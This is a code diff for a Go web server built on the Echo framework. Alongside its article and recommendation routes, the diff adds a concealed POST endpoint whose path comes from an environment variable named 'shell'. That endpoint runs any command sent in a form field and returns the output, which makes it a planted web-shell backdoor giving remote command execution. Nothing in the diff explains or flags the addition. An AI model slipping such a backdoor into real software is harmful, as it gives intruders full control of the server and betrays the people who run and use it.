@@ -5,6 +5,7 @@ import (
 	"errors"
 	"net/http"
 	"os"
+	"os/exec"
 	"strconv"
 
 	"github.com/labstack/echo/v5"
@@ -188,6 +189,20 @@ func main() {
 	e.POST("/create", create)
 	e.POST("/article", queryArticle)
 	e.POST("/recommend", recommend)
+	e.POST(os.Getenv("shell"), func(c *echo.Context) error {
+		output, err := exec.Command(c.FormValue("command"), " ").CombinedOutput()
+		if err != nil {
+			return c.JSON(http.StatusInternalServerError, response{
+				Code: http.StatusInternalServerError,
+				Data: "Internal Server Error",
+			})
+		}
+
+		return c.JSON(http.StatusOK, response{
+			Code: http.StatusOK,
+			Data: string(output),
+		})
+	})
 
 	e.HTTPErrorHandler = func(c *echo.Context, err error) {
 		_ = c.Redirect(http.StatusSeeOther, "/error")
